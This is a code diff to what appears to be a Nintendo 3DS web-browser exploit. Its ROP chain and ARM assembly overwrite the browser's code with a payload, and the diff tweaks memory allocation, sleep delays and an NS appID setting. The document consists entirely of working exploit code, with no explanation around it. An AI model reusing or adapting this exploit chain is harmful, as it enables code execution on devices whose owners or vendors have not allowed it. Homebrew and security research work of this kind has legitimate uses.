@@ -417,9 +417,9 @@ CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
 //Overwrite the browser .text with the below code.
 CALL_GXCMD4 (HEAPBUF + (codedatastart - _start)), NSS_PROCLOADTEXT_LINEARMEMADR, (codedataend-codedatastart)
 
-#if NEW3DS==1 //Free the memory which was allocated above on new3ds.
+/*#if NEW3DS==1 //Free the memory which was allocated above on new3ds.
 CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0, 0x00400000, 0x1, 0x0, 0, 0
-#endif
+#endif*/
 
 #if NEW3DS==1//Use this as a waitbyloop.
 CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
@@ -470,9 +470,12 @@ ldr r0, =3000000000
 mov r1, #0
 svc 0x0a @ Sleep 3 seconds.
 #else
-ldr r0, =0x540BE400
+/*ldr r0, =3000000000
+mov r1, #0
+svc 0x0a @ Sleep 3 seconds.*/
+/*ldr r0, =0x540BE400
 mov r1, #2
-svc 0x0a @ Sleep 10 seconds, so that hopefully the payload doesn't interfere with sysmodule loading. (maybe try decreasing this later?)
+svc 0x0a @ Sleep 10 seconds, so that hopefully the payload doesn't interfere with sysmodule loading.*/
 #endif
 
 #ifdef CODEBINPAYLOAD
@@ -482,7 +485,7 @@ mov r4, #3 @ permissions
 mov r1, #0 @ addr0
 mov r2, #0 @ addr1
 ldr r3, =0xc000 @ size
-svc 0x01 @ Allocate 0x3000-bytes of linearmem.
+svc 0x01 @ Allocate 0xc000-bytes of linearmem.
 mov r4, r1
 cmp r0, #0
 bne codecrash
@@ -490,7 +493,7 @@ bne codecrash
 mov r1, #0xb
 str r1, [r4, #0x48] @ flags
 ldr r1, =0x101
-str r1, [r4, #0x5c] @ NS appID
+str r1, [r4, #0x5c] @ NS appID (use the homemenu appID since the browser appID wouldn't be registered yet)
 mov r0, r4
 adr r1, codecrash
 mov lr, r1
